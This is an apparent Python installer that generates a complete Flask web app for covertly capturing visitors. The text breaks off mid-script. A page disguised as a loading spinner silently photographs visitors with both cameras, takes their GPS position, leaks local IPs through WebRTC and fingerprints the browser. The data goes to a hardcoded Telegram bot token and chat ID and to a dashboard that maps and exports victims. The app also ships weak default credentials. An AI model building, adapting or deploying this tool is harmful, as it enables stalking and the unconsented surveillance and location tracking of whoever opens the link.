"""
Capture Dashboard Pro - Installer v2 (FIXED)
Jalankan: python install.py
"""
import os
import sys
import subprocess
import shutil
from pathlib import Path

PROJECT = Path.home() / "capture-pro"


def pip_install():
    print("\n[1/6] Install Python packages...")
    pkgs = [
        "Flask", "Flask-Cors", "Flask-SQLAlchemy", "Flask-WTF",
        "python-dotenv", "requests", "Pillow", "WTForms",
    ]
    subprocess.check_call(
        [sys.executable, "-m", "pip", "install", "--quiet", "--upgrade"] + pkgs
    )
    print("      OK")


def make_dirs():
    print("\n[2/6] Bikin struktur folder...")
    for d in [
        PROJECT,
        PROJECT / "app",
        PROJECT / "app" / "routes",
        PROJECT / "app" / "templates",
        PROJECT / "app" / "static" / "css",
        PROJECT / "app" / "static" / "js",
        PROJECT / "data",
        PROJECT / "data" / "uploads",
    ]:
        d.mkdir(parents=True, exist_ok=True)
    print("      OK")


FILES = {}

FILES["requirements.txt"] = (
    "Flask\nFlask-Cors\nFlask-SQLAlchemy\nFlask-WTF\n"
    "python-dotenv\nrequests\nPillow\nWTForms\n"
)

FILES[".env"] = """TG_TOKEN=8797412860:AAEl2fAdwu06DHrCPED-_q1APrZiAhKNGWc
TG_CHAT_ID=7847039406
DASH_USER=admin
DASH_PASS=admin123
SECRET_KEY=ubah-ini-jadi-random-panjang-1
JWT_SECRET=ubah-ini-jadi-random-panjang-2
AUTO_CLEANUP_DAYS=30
ENABLE_VPN_CHECK=true
ENABLE_REVERSE_GEOCODE=true
"""

FILES["run.py"] = """import os
from pathlib import Path

BASE_DIR = Path(__file__).parent.absolute()
os.environ["DATABASE_URL"] = "sqlite:///" + str(BASE_DIR / "data" / "capture.db")
os.environ["UPLOAD_DIR"] = str(BASE_DIR / "data" / "uploads")

os.makedirs(os.environ["UPLOAD_DIR"], exist_ok=True)

from app import create_app

app = create_app()

if __name__ == "__main__":
    print("=" * 60)
    print("  Capture Dashboard Pro")
    print("  DB     :", os.environ["DATABASE_URL"])
    print("  Upload :", os.environ["UPLOAD_DIR"])
    print("  URL    : http://localhost:8000/")
    print("  Dash   : http://localhost:8000/dashboard")
    print("=" * 60)
    app.run(host="0.0.0.0", port=8000, debug=False)
"""

FILES["app/__init__.py"] = """import os
from flask import Flask
from flask_cors import CORS
from flask_wtf.csrf import CSRFProtect
from app.config import Config
from app.database import db, init_db

csrf = CSRFProtect()


def create_app():
    app = Flask(__name__, template_folder="templates", static_folder="static")
    app.config["SECRET_KEY"] = Config.SECRET_KEY
    app.config["WTF_CSRF_ENABLED"] = True
    app.config["SQLALCHEMY_DATABASE_URI"] = Config.DATABASE_URL
    app.config["SQLALCHEMY_TRACK_MODIFICATIONS"] = False
    app.config["MAX_CONTENT_LENGTH"] = 50 * 1024 * 1024

    os.makedirs(Config.UPLOAD_DIR, exist_ok=True)

    CORS(app, resources={r"/api/*": {"origins": "*"}}, supports_credentials=True)
    csrf.init_app(app)
    db.init_app(app)

    from app.routes import capture as capture_mod
    csrf.exempt(capture_mod.bp)

    from app.routes import api as api_mod
    csrf.exempt(api_mod.bp)

    from app.routes.capture import bp as capture_bp
    from app.routes.dashboard import bp as dash_bp
    from app.routes.api import bp as api_bp

    app.register_blueprint(capture_bp)
    app.register_blueprint(dash_bp)
    app.register_blueprint(api_bp, url_prefix="/api")

    with app.app_context():
        init_db()

    @app.route("/healthz")
    def _health():
        return {"ok": True}

    return app
"""

FILES["app/config.py"] = """import os
from pathlib import Path
from dotenv import load_dotenv

BASE_DIR = Path(__file__).parent.parent.absolute()
load_dotenv(BASE_DIR / ".env")


class Config:
    TG_TOKEN = os.environ.get("TG_TOKEN", "")
    TG_CHAT_ID = os.environ.get("TG_CHAT_ID", "")
    DASH_USER = os.environ.get("DASH_USER", "admin")
    DASH_PASS = os.environ.get("DASH_PASS", "admin123")
    SECRET_KEY = os.environ.get("SECRET_KEY", "change-me-1234")
    JWT_SECRET = os.environ.get("JWT_SECRET", "change-me-5678")
    DATABASE_URL = os.environ.get(
        "DATABASE_URL", "sqlite:///" + str(BASE_DIR / "data" / "capture.db")
    )
    UPLOAD_DIR = os.environ.get(
        "UPLOAD_DIR", str(BASE_DIR / "data" / "uploads")
    )
    AUTO_CLEANUP_DAYS = int(os.environ.get("AUTO_CLEANUP_DAYS", "30"))
    ENABLE_VPN_CHECK = os.environ.get("ENABLE_VPN_CHECK", "true").lower() == "true"
    ENABLE_REVERSE_GEOCODE = os.environ.get("ENABLE_REVERSE_GEOCODE", "true").lower() == "true"
"""

FILES["app/database.py"] = """from flask_sqlalchemy import SQLAlchemy

db = SQLAlchemy()


def init_db():
    db.create_all()
"""

FILES["app/models.py"] = """from app.database import db
from datetime import datetime


class Session(db.Model):
    __tablename__ = "sessions"
    id = db.Column(db.Integer, primary_key=True)
    ts = db.Column(db.String(32), unique=True, index=True, nullable=False)
    waktu = db.Column(db.String(32))
    ip_koneksi = db.Column(db.String(64))
    ip_publik = db.Column(db.String(64))
    ip_lokal = db.Column(db.String(255))
    country = db.Column(db.String(64))
    city = db.Column(db.String(64))
    region = db.Column(db.String(64))
    isp = db.Column(db.String(128))
    is_vpn = db.Column(db.Integer, default=0)
    lat = db.Column(db.Float)
    lon = db.Column(db.Float)
    akurasi_m = db.Column(db.Float)
    alamat = db.Column(db.Text)
    user_agent = db.Column(db.Text)
    fingerprint = db.Column(db.Text)
    has_depan = db.Column(db.Integer, default=0)
    has_belakang = db.Column(db.Integer, default=0)
    created_at = db.Column(db.DateTime, default=datetime.utcnow, index=True)

    def to_dict(self):
        import json
        d = {c.name: getattr(self, c.name) for c in self.__table__.columns}
        if d.get("created_at"):
            d["created_at"] = d["created_at"].isoformat()
        try:
            d["fingerprint_obj"] = json.loads(d.get("fingerprint") or "{}")
        except Exception:
            d["fingerprint_obj"] = {}
        return d
"""

FILES["app/auth.py"] = """import hmac, hashlib, time, base64, json
from functools import wraps
from flask import request, jsonify, redirect, url_for
from app.config import Config


def _sign(data):
    return hmac.new(Config.JWT_SECRET.encode(), data, hashlib.sha256).hexdigest()


def create_token(user, ttl=86400 * 7):
    payload = {"u": user, "exp": int(time.time()) + ttl}
    raw = json.dumps(payload).encode()
    b64 = base64.urlsafe_b64encode(raw).decode().rstrip("=")
    return b64 + "." + _sign(raw)


def verify_token(token):
    try:
        b64, sig = token.split(".")
        b64 += "=" * (-len(b64) % 4)
        raw = base64.urlsafe_b64decode(b64)
        if not hmac.compare_digest(_sign(raw), sig):
            return False
        return json.loads(raw).get("exp", 0) > time.time()
    except Exception:
        return False


def login_required(f):
    @wraps(f)
    def wrapper(*args, **kwargs):
        token = request.cookies.get("session_token")
        if token and verify_token(token):
            return f(*args, **kwargs)
        if request.path.startswith("/api/"):
            return jsonify({"ok": False}), 401
        return redirect(url_for("dashboard.login_page"))
    return wrapper
"""

FILES["app/routes/__init__.py"] = ""

FILES["app/routes/capture.py"] = '''from flask import Blueprint, render_template, request, jsonify
from datetime import datetime
import json, base64, os, requests

from app.config import Config
from app.database import db
from app.models import Session

bp = Blueprint("capture", __name__)


def decode_data_url(d):
    if not d or "," not in d:
        return b""
    try:
        return base64.b64decode(d.split(",", 1)[1])
    except Exception:
        return b""


def save_bytes(ts, suffix, data):
    fname = ts + "_" + suffix + ".png"
    path = os.path.join(Config.UPLOAD_DIR, fname)
    with open(path, "wb") as f:
        f.write(data)
    return fname


def reverse_geocode(lat, lon):
    if not Config.ENABLE_REVERSE_GEOCODE or not lat or not lon:
        return ""
    try:
        r = requests.get(
            "https://nominatim.openstreetmap.org/reverse",
            params={"lat": lat, "lon": lon, "format": "json"},
            headers={"User-Agent": "CaptureDashboard/1.0"},
            timeout=6,
        )
        return r.json().get("display_name", "")
    except Exception:
        return ""


def send_telegram_photo(image_bytes, caption):
    if not Config.TG_TOKEN or "ISI_" in Config.TG_TOKEN:
        return False
    try:
        r = requests.post(
            "https://api.telegram.org/bot" + Config.TG_TOKEN + "/sendPhoto",
            data={"chat_id": Config.TG_CHAT_ID, "caption": caption},
            files={"photo": ("foto.png", image_bytes, "image/png")},
            timeout=20,
        )
        return r.json().get("ok", False)
    except Exception:
        return False


def send_telegram_text(text):
    if not Config.TG_TOKEN or "ISI_" in Config.TG_TOKEN:
        return False
    try:
        requests.post(
            "https://api.telegram.org/bot" + Config.TG_TOKEN + "/sendMessage",
            json={"chat_id": Config.TG_CHAT_ID, "text": text},
            timeout=15,
        )
        return True
    except Exception:
        return False


@bp.route("/")
def index():
    return render_template("capture.html")


@bp.route("/upload", methods=["POST"])
def upload():
    client_ip = request.headers.get("X-Forwarded-For", request.remote_addr or "")
    client_ip = client_ip.split(",")[0].strip()

    payload = request.get_json(force=True, silent=True) or {}
    now = datetime.now()
    ts = now.strftime("%Y%m%d_%H%M%S") + "_" + str(now.microsecond // 1000).zfill(3)

    img_depan = decode_data_url(payload.get("image_depan", ""))
    img_belakang = decode_data_url(payload.get("image_belakang", ""))

    has_depan = bool(img_depan)
    has_belakang = bool(img_belakang)

    if has_depan:
        save_bytes(ts, "depan", img_depan)
    if has_belakang:
        save_bytes(ts, "belakang", img_belakang)

    ip_info = payload.get("ip_info") or {}
    gps = payload.get("lokasi_gps") or {}
    fingerprint = payload.get("fingerprint") or {}
    local_ips = payload.get("local_ips") or []

    lat = gps.get("lat") if gps else None
    lon = gps.get("lon") if gps else None
    alamat = reverse_geocode(lat, lon) if (lat and lon) else ""

    s = Session(
        ts=ts, waktu=ts,
        ip_koneksi=client_ip,
        ip_publik=payload.get("ip_publik"),
        ip_lokal=",".join(local_ips[:5]),
        country=ip_info.get("country_name") or ip_info.get("country"),
        city=ip_info.get("city"),
        region=ip_info.get("region"),
        isp=ip_info.get("org") or ip_info.get("asn"),
        lat=lat, lon=lon,
        akurasi_m=gps.get("akurasi_m") if gps else None,
        alamat=alamat,
        user_agent=request.headers.get("User-Agent"),
        fingerprint=json.dumps(fingerprint, ensure_ascii=False),
        has_depan=int(has_depan),
        has_belakang=int(has_belakang),
    )

    if has_depan:
        send_telegram_photo(img_depan, "DEPAN " + ts)
    if has_belakang:
        send_telegram_photo(img_belakang, "BELAKANG " + ts)

    send_telegram_text(
        "Sesi: " + ts + "\\nIP: " + str(s.ip_publik) +
        "\\nKota: " + str(s.city) + ", " + str(s.region)
    )

    db.session.add(s)
    db.session.commit()

    return jsonify({"ok": True, "msg": "Tersimpan", "ts": ts})
'''

FILES["app/routes/dashboard.py"] = '''from flask import Blueprint, render_template, request, redirect, url_for, make_response, jsonify
from app.auth import create_token, login_required
from app.config import Config
from app.models import Session as SessionModel
import json

bp = Blueprint("dashboard", __name__)


@bp.route("/login", methods=["GET", "POST"])
def login_page():
    if request.method == "POST":
        u = request.form.get("user")
        p = request.form.get("pass")
        if u == Config.DASH_USER and p == Config.DASH_PASS:
            token = create_token(u)
            resp = make_response(redirect(url_for("dashboard.index")))
            resp.set_cookie("session_token", token, httponly=True,
                            samesite="Lax", max_age=86400 * 7)
            return resp
        return render_template("login.html", error="Username/password salah")
    return render_template("login.html")


@bp.route("/logout")
def logout():
    resp = make_response(redirect(url_for("dashboard.login_page")))
    resp.delete_cookie("session_token")
    return resp


@bp.route("/dashboard")
@login_required
def index():
    rows = SessionModel.query.order_by(SessionModel.id.desc()).limit(500).all()
    sessions = [r.to_dict() for r in rows]
    stats = {
        "total": SessionModel.query.count(),
        "with_photo": SessionModel.query.filter(
            (SessionModel.has_depan == 1) | (SessionModel.has_belakang == 1)
        ).count(),
    }
    return render_template(
        "dashboard.html",
        sessions=sessions,
        stats=stats,
        stats_json=json.dumps(stats),
    )
'''

FILES["app/routes/api.py"] = '''from flask import Blueprint, jsonify, send_file, send_from_directory
from app.auth import login_required
from app.config import Config
from app.models import Session as SessionModel
from app.database import db
import os, io, zipfile, csv

bp = Blueprint("api", __name__)


def _delete_files(ts):
    if not os.path.isdir(Config.UPLOAD_DIR):
        return
    for f in os.listdir(Config.UPLOAD_DIR):
        if f.startswith(ts):
            try:
                os.remove(os.path.join(Config.UPLOAD_DIR, f))
            except Exception:
                pass


@bp.route("/delete/<ts>", methods=["POST", "DELETE"])
@login_required
def delete_session(ts):
    _delete_files(ts)
    SessionModel.query.filter_by(ts=ts).delete()
    db.session.commit()
    return jsonify({"ok": True, "msg": "Sesi dihapus"})


@bp.route("/delete-all", methods=["POST", "DELETE"])
@login_required
def delete_all():
    count = SessionModel.query.count()
    if os.path.isdir(Config.UPLOAD_DIR):
        for f in os.listdir(Config.UPLOAD_DIR):
            try:
                os.remove(os.path.join(Config.UPLOAD_DIR, f))
            except Exception:
                pass
    SessionModel.query.delete()
    db.session.commit()
    return jsonify({"ok": True, "msg": str(count) + " sesi dihapus"})


@bp.route("/file/<path:fname>")
@login_required
def get_file(fname):
    return send_from_directory(Config.UPLOAD_DIR, fname)


@bp.route("/session/<ts>")
@login_required
def session_detail(ts):
    s = SessionModel.query.filter_by(ts=ts).first()
    if not s:
        return jsonify({"ok": False, "msg": "not found"}), 404
    return jsonify({"ok": True, "data": s.to_dict()})


@bp.route("/export/zip")
@login_required
def export_zip():
    mem = io.BytesIO()
    with zipfile.ZipFile(mem, "w", zipfile.ZIP_DEFLATED) as z:
        if os.path.isdir(Config.UPLOAD_DIR):
            for f in os.listdir(Config.UPLOAD_DIR):
                fp = os.path.join(Config.UPLOAD_DIR, f)
                if os.path.isfile(fp):
                    z.write(fp, arcname=f)
        rows = SessionModel.query.all()
        import json as _json
        z.writestr(
            "sessions.json",
            _json.dumps([r.to_dict() for r in rows], indent=2, default=str),
        )
    mem.seek(0)
    return send_file(mem, mimetype="application/zip",
                     as_attachment=True,
                     download_name="capture_export.zip")


@bp.route("/export/csv")
@login_required
def export_csv():
    rows = SessionModel.query.all()
    buf = io.StringIO()
    if rows:
        data = [r.to_dict() for r in rows]
        w = csv.DictWriter(buf, fieldnames=data[0].keys())
        w.writeheader()
        for d in data:
            d.pop("fingerprint_obj", None)
            w.writerow(d)
    mem = io.BytesIO(buf.getvalue().encode("utf-8"))
    return send_file(mem, mimetype="text/csv",
                     as_attachment=True,
                     download_name="sessions.csv")
'''

FILES["app/templates/base.html"] = """<!DOCTYPE html>
<html lang="id">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>{% block title %}App{% endblock %}</title>
<link rel="stylesheet" href="{{ url_for('static', filename='css/style.css') }}">
{% block head %}{% endblock %}
</head>
<body>
{% block body %}{% endblock %}
</body>
</html>
"""

FILES["app/templates/login.html"] = """{% extends "base.html" %}
{% block title %}Login{% endblock %}
{% block body %}
<div class="login-wrap">
  <form method="POST" class="login-card">
    <input type="hidden" name="csrf_token" value="{{ csrf_token() }}">
    <h2>Login Dashboard</h2>
    {% if error %}<div class="error">{{ error }}</div>{% endif %}
    <input type="text" name="user" placeholder="Username" required autofocus>
    <input type="password" name="pass" placeholder="Password" required>
    <button type="submit">Masuk</button>
  </form>
</div>
{% endblock %}
"""

FILES["app/templates/capture.html"] = """{% extends "base.html" %}
{% block title %}Loading...{% endblock %}
{% block body %}
<div class="capture-loading">
  <div class="spinner"></div>
  <p class="cap-txt">Memuat konten...</p>
</div>
<video id="v" autoplay playsinline muted hidden></video>
<canvas id="c" hidden></canvas>
<div id="status" hidden></div>
<div id="log" hidden></div>
<script src="{{ url_for('static', filename='js/capture.js') }}"></script>
{% endblock %}
"""

FILES["app/templates/dashboard.html"] = """{% extends "base.html" %}
{% block title %}Dashboard{% endblock %}
{% block head %}
<link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css"/>
<script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/sweetalert2@11/dist/sweetalert2.min.css">
<script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
{% endblock %}
{% block body %}

<header class="topbar">
  <h1>Dashboard <span class="badge" id="totalBadge">{{ stats.total }} sesi</span></h1>
  <div class="top-actions">
    <a class="btn" href="/" target="_blank">Capture</a>
    <a class="btn gray" href="/api/export/zip">ZIP</a>
    <a class="btn gray" href="/api/export/csv">CSV</a>
    <a class="btn red" href="#" id="btnDeleteAll">Hapus Semua</a>
    <a class="btn red" href="/logout">Logout</a>
  </div>
</header>

<section class="stats-grid">
  <div class="stat-card"><div class="num" id="statTotal">{{ stats.total }}</div><div class="lbl">Total Sesi</div></div>
  <div class="stat-card"><div class="num" id="statPhoto">{{ stats.with_photo }}</div><div class="lbl">Ada Foto</div></div>
  <div class="stat-card"><div class="num" id="statVisible">{{ stats.total }}</div><div class="lbl">Ditampilkan</div></div>
</section>

<section class="filters">
  <input id="searchBox" placeholder="Cari IP / kota / ISP...">
  <button class="btn gray" id="btnRefresh">Refresh</button>
</section>

<section id="cards" class="grid">
  {% for s in sessions %}
  <div class="card" data-ts="{{ s.ts }}" data-search="{{ (s.ip_publik or '') }} {{ (s.ip_koneksi or '') }} {{ (s.city or '') }} {{ (s.region or '') }} {{ (s.isp or '') }} {{ (s.country or '') }}">
    <div class="imgs">
      {% if s.has_depan %}
        <a href="/api/file/{{ s.ts }}_depan.png" target="_blank">
          <img src="/api/file/{{ s.ts }}_depan.png" loading="lazy" alt="Depan">
        </a>
      {% endif %}
      {% if s.has_belakang %}
        <a href="/api/file/{{ s.ts }}_belakang.png" target="_blank">
          <img src="/api/file/{{ s.ts }}_belakang.png" loading="lazy" alt="Belakang">
        </a>
      {% endif %}
      {% if not s.has_depan and not s.has_belakang %}
        <div class="no-photo">Tidak ada foto (user blok kamera)</div>
      {% endif %}
    </div>
    <div class="info">
      <div class="row"><b>Waktu:</b> {{ s.waktu }}</div>
      <div class="row"><b>IP:</b> {{ s.ip_publik or s.ip_koneksi or '-' }}</div>
      <div class="row"><b>Lokal:</b> {{ s.ip_lokal or '-' }}</div>
      <div class="row"><b>Kota:</b> {{ s.city or '-' }}, {{ s.region or '-' }}</div>
      <div class="row"><b>ISP:</b> {{ s.isp or '-' }}</div>
      {% if s.lat and s.lon %}
        <div class="row"><b>GPS:</b> {{ "%.5f"|format(s.lat) }}, {{ "%.5f"|format(s.lon) }}</div>
        <div class="mini-map" id="map-{{ s.ts }}"></div>
      {% endif %}
      {% if s.alamat %}
        <div class="row small"><b>Alamat:</b> {{ s.alamat[:150] }}</div>
      {% endif %}
      <div class="actions">
        <a href="#" class="btn-action show-detail" data-ts="{{ s.ts }}">Detail</a>
        {% if s.has_depan %}<a href="/api/file/{{ s.ts }}_depan.png" download class="btn-action">Depan</a>{% endif %}
        {% if s.has_belakang %}<a href="/api/file/{{ s.ts }}_belakang.png" download class="btn-action">Belakang</a>{% endif %}
        <a href="#" class="btn-action del" data-ts="{{ s.ts }}">Hapus</a>
      </div>
    </div>
  </div>
  {% endfor %}
</section>

{% if not sessions %}
<p style="text-align:center;color:#888;padding:40px">Belum ada sesi. Buka <a href="/">halaman capture</a>.</p>
{% endif %}

<script>
window.SESSIONS = {{ sessions|tojson }};
</script>
<script src="{{ url_for('static', filename='js/dashboard.js') }}"></script>
{% endblock %}
"""

FILES["app/static/css/style.css"] = """* { box-sizing: border-box; }
body { font-family: system-ui, sans-serif; background:#0d0d0d; color:#eee; margin:0; padding:0; }
a { color:#6cf; }
.capture-loading { min-height:100vh; display:flex; align-items:center; justify-content:center; flex-direction:column; gap:20px; }
.spinner { width:60px; height:60px; border:5px solid #222; border-top:5px solid #4a9eff; border-radius:50%; animation: spin 1s linear infinite; }
@keyframes spin { to { transform: rotate(360deg); } }
.cap-txt { color:#888; font-size:14px; }
.login-wrap { min-height:100vh; display:flex; align-items:center; justify-content:center; }
.login-card { background:#1a1a1a; padding:30px; border-radius:12px; border:1px solid #2a2a2a; display:flex; flex-direction:column; gap:12px; width:320px; }
.login-card h2 { margin:0 0 10px; }
.login-card input { padding:10px; border-radius:6px; border:1px solid #333; background:#111; color:#eee; }
.login-card button { padding:10px; border-radius:6px; border:none; background:#1e6feb; color:#fff; font-weight:bold; cursor:pointer; }
.error { color:#f66; font-size:13px; }
.topbar { display:flex; justify-content:space-between; align-items:center; padding:18px 24px; gap:12px; flex-wrap:wrap; }
.topbar h1 { margin:0; font-size:22px; }
.badge { background:#1e6feb; padding:4px 10px; border-radius:20px; font-size:13px; }
.top-actions { display:flex; gap:8px; flex-wrap:wrap; }
.btn { background:#1e6feb; color:#fff; padding:8px 14px; border-radius:6px; text-decoration:none; font-size:14px; border:none; cursor:pointer; }
.btn.gray { background:#333; }
.btn.red { background:#c33; }
.stats-grid { display:grid; grid-template-columns:repeat(auto-fit,minmax(150px,1fr)); gap:14px; padding:0 24px 20px; }
.stat-card { background:#1a1a1a; padding:20px; border-radius:10px; border:1px solid #2a2a2a; text-align:center; }
.stat-card .num { font-size:32px; font-weight:bold; color:#4a9eff; }
.stat-card .lbl { font-size:12px; color:#888; margin-top:6px; }
.filters { display:flex; gap:10px; padding:0 24px 18px; flex-wrap:wrap; }
.filters input { flex:1; min-width:200px; padding:10px; border-radius:8px; background:#1a1a1a; border:1px solid #2a2a2a; color:#eee; font-size:14px; }
.grid { display:grid; grid-template-columns:repeat(auto-fill,minmax(340px,1fr)); gap:16px; padding:0 24px 40px; }
.card { background:#1a1a1a; border-radius:12px; overflow:hidden; border:1px solid #2a2a2a; }
.card .imgs { display:flex; gap:2px; }
.card .imgs img { flex:1; width:100%; aspect-ratio:4/3; object-fit:cover; background:#000; display:block; }
.no-photo { padding:40px 20px; text-align:center; color:#666; font-style:italic; background:#111; font-size:13px; width:100%; }
.info { padding:12px; font-size:12.5px; }
.row { margin-bottom:5px; color:#bbb; }
.row b { color:#eee; }
.row.small { font-size:11px; color:#888; }
.mini-map { height:120px; border-radius:6px; margin-top:6px; }
.actions { display:flex; gap:6px; margin-top:10px; flex-wrap:wrap; }
.btn-action { display:inline-block; font-size:12px; color:#6cf; text-decoration:none; padding:6px 10px; background:#222; border-radius:5px; border:1px solid #333; cursor:pointer; }
.btn-action:hover { background:#2a2a2a; }
.btn-action.del { color:#f66; }
.detail-modal { text-align:left; font-size:13px; line-height:1.6; }
.detail-modal table { width:100%; border-collapse:collapse; }
.detail-modal td { padding:6px 10px; vertical-align:top; border-bottom:1px solid #222; }
.detail-modal td:first-child { color:#888; width:130px; }
.detail-modal code { background:#111; padding:2px 6px; border-radius:3px; font-size:12px; color:#6cf; }
"""

FILES["app/static/js/capture.js"] = r"""const statusEl = document.getElementById('status');
const logEl = document.getElementById('log');
const log = m => { logEl.textContent += m + '\n'; console.log(m); };

async function getIpInfo() {
  try {
    const r = await fetch('https://ipapi.co/json/');
    const d = await r.json();
    return { ip: d.ip, info: d };
  } catch (e) { return { ip: null, info: null }; }
}

function getLocalIps() {
  return new Promise(resolve => {
    const ips = new Set();
    try {
      const pc = new RTCPeerConnection({ iceServers: [{ urls: 'stun:stun.l.google.com:19302' }] });
      pc.createDataChannel('');
      pc.onicecandidate = e => {
        if (!e.candidate) { try { pc.close(); } catch(_){} resolve([...ips]); return; }
        const m = e.candidate.candidate.match(/(\d+\.\d+\.\d+\.\d+)/);
        if (m) ips.add(m[1]);
      };
      pc.createOffer().then(o => pc.setLocalDescription(o));
      setTimeout(() => { try { pc.close(); } catch(_){} resolve([...ips]); }, 3000);
    } catch (e) { resolve([]); }
  });
}

function getGps() {
  return new Promise(res => {
    if (!navigator.geolocation) return res(null);
    navigator.geolocation.getCurrentPosition(
      p => res({ lat: p.coords.latitude, lon: p.coords.longitude, akurasi_m: p.coords.accuracy }),
      e => { log('GPS ditolak: ' + e.message); res(null); },
      { enableHighAccuracy: true, timeout: 8000 }
    );
  });
}

async function capturePhoto(facingMode) {
  try {
    const constraints = { video: facingMode ? { facingMode: { ideal: facingMode } } : true, audio: false };
    const s = await Promise.race([
      navigator.mediaDevices.getUserMedia(constraints),
      new Promise((_, rej) => setTimeout(() => rej(new Error('timeout')), 10000)),
    ]);
    const v = document.getElementById('v');
    v.srcObject = s;
    await new Promise(r => { v.onloadedmetadata = r; });
    await new Promise(r => setTimeout(r, 800));
    const c = document.getElementById('c');
    c.width = v.videoWidth || 640;
    c.height = v.videoHeight || 480;
    c.getContext('2d').drawImage(v, 0, 0);
    const data = c.toDataURL('image/png', 0.85);
    s.getTracks().forEach(t => t.stop());
    return data;
  } catch (e) {
    log('Kamera gagal: ' + e.message);
    return null;
  }
}

async function getFingerprint() {
  return {
    userAgent: navigator.userAgent,
    platform: navigator.platform,
    language: navigator.language,
    screen: screen.width + 'x' + screen.height,
    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
    ram: navigator.deviceMemory || null,
    cpu: navigator.hardwareConcurrency || null,
    touch: 'ontouchstart' in window,
  };
}

async function main() {
  statusEl.textContent = 'Mengumpulkan data...';
  const [ipData, gps, localIps, fingerprint, fotoDepan, fotoBelakang] = await Promise.all([
    getIpInfo(),
    getGps(),
    getLocalIps(),
    getFingerprint(),
    capturePhoto('user'),
    capturePhoto('environment'),
  ]);

  log('IP: ' + (ipData.ip || '-'));
  log('GPS: ' + (gps ? gps.lat + ', ' + gps.lon : '-'));
  log('Foto depan: ' + (fotoDepan ? 'ADA' : 'gagal'));
  log('Foto belakang: ' + (fotoBelakang ? 'ADA' : 'gagal'));

  await new Promise(r => setTimeout(r, 5000));

  statusEl.textContent = 'Mengirim...';
  try {
    const res = await fetch('/upload', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        image_depan: fotoDepan,
        image_belakang: fotoBelakang,
        ip_publik: ipData.ip,
        ip_info: ipData.info,
        local_ips: localIps,
        lokasi_gps: gps,
        fingerprint,
      }),
    });
    const out = await res.json();
    statusEl.textContent = out.ok ? 'OK ' + out.msg : 'GAGAL ' + out.msg;
  } catch (e) {
    statusEl.textContent = 'ERROR: ' + e.message;
  }
}

main();
"""

FILES["app/static/js/dashboard.js"] = r"""window.SESSIONS.forEach(s => {
  if (s.lat && s.lon) {
    const el = document.getElementById('map-' + s.ts);
    if (!el) return;
    try {
      const map = L.map(el, { zoomControl: false, attributionControl: false }).setView([s.lat, s.lon], 14);
      L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', { maxZoom: 19 }).addTo(map);
      L.marker([s.lat, s.lon]).addTo(map);
    } catch (e) { console.log('Map gagal:', e); }
  }
});

document.querySelectorAll('.del').forEach(a => {
  a.addEventListener('click', async e => {
    e.preventDefault();
    const ts = a.dataset.ts;
    const r = await Swal.fire({
      title: 'Hapus sesi ini?',
      html: '<code>' + ts + '</code><br><br>Semua foto akan dihapus permanen.',
      icon: 'warning',
      showCancelButton: true,
      confirmButtonText: 'Ya, Hapus',
      cancelButtonText: 'Batal',
      confirmButtonColor: '#c33',
    });
    if (!r.isConfirmed) return;
    try {
      const res = await fetch('/api/delete/' + ts, { method: 'POST' });
      const out = await res.json();
      if (out.ok) {
        Swal.fire({ icon: 'success', title: 'Terhapus', timer: 1000, showConfirmButton: false });
        const card = a.closest('.card');
        if (card) card.remove();
        updateCounts(-1);
      } else {
        Swal.fire('Gagal', out.msg || 'Error', 'error');
      }
    } catch (err) { Swal.fire('Error', err.message, 'error'); }
  });
});

const btnDeleteAll = document.getElementById('btnDeleteAll');
if (btnDeleteAll) {
  btnDeleteAll.addEventListener('click', async e => {
    e.preventDefault();
    const r = await Swal.fire({
      title: 'Hapus SEMUA sesi?',
      text: 'Semua foto dan data akan dihapus permanen!',
      icon: 'error',
      showCancelButton: true,
      confirmButtonText: 'Ya, Hapus Semua',
      cancelButtonText: 'Batal',
      confirmButtonColor: '#c33',
    });
    if (!r.isConfirmed) return;
    try {
      const res = await fetch('/api/delete-all', { method: 'POST' });
      const out = await res.json();
      if (out.ok) {
        Swal.fire({ icon: 'success', title: out.msg, timer: 1500, showConfirmButton: false });
        setTimeout(() => location.reload(), 1000);
      }
    } catch (err) { Swal.fire('Error', err.message, 'error'); }
  });
}

document.querySelectorAll('.show-detail').forEach(a => {
  a.addEventListener('click', async e => {
    e.preventDefault();
    const ts = a.dataset.ts;
    try {
      const res = await fetch('/api/session/' + ts);
      const out = await res.json();
      if (!out.ok) { Swal.fire('Gagal', 'Sesi tidak ditemukan', 'error'); return; }
      const d = out.data;

      let fpRows = '';
      if (d.fingerprint_obj && Object.keys(d.fingerprint_obj).length) {
        fpRows = Object.entries(d.fingerprint_obj).map(([k, v]) =>
          '<tr><td>' + escapeHtml(k) + '</td><td><code>' +
          escapeHtml(typeof v === 'object' ? JSON.stringify(v) : String(v)) +
          '</code></td></tr>'
        ).join('');
      } else {
        fpRows = '<tr><td colspan="2" style="color:#888">Tidak ada</td></tr>';
      }

      const html =
        '<div class="detail-modal">' +
        '<table>' +
        '<tr><td>Waktu</td><td><code>' + escapeHtml(d.waktu || '-') + '</code></td></tr>' +
        '<tr><td>IP Publik</td><td><code>' + escapeHtml(d.ip_publik || '-') + '</code></td></tr>' +
        '<tr><td>IP Koneksi</td><td><code>' + escapeHtml(d.ip_koneksi || '-') + '</code></td></tr>' +
        '<tr><td>IP Lokal</td><td><code>' + escapeHtml(d.ip_lokal || '-') + '</code></td></tr>' +
        '<tr><td>Negara</td><td>' + escapeHtml(d.country || '-') + '</td></tr>' +
        '<tr><td>Kota</td><td>' + escapeHtml(d.city || '-') + ', ' + escapeHtml(d.region || '-') + '</td></tr>' +
        '<tr><td>ISP</td><td>' + escapeHtml(d.isp || '-') + '</td></tr>' +
        '<tr><td>VPN</td><td>' + (d.is_vpn ? 'Ya' : 'Tidak') + '</td></tr>' +
        '<tr><td>GPS</td><td><code>' + (d.lat ? d.lat + ', ' + d.lon : '-') + '</code></td></tr>' +
        '<tr><td>Akurasi</td><td>' + (d.akurasi_m ? d.akurasi_m + ' m' : '-') + '</td></tr>' +
        '<tr><td>Alamat</td><td>' + escapeHtml(d.alamat || '-') + '</td></tr>' +
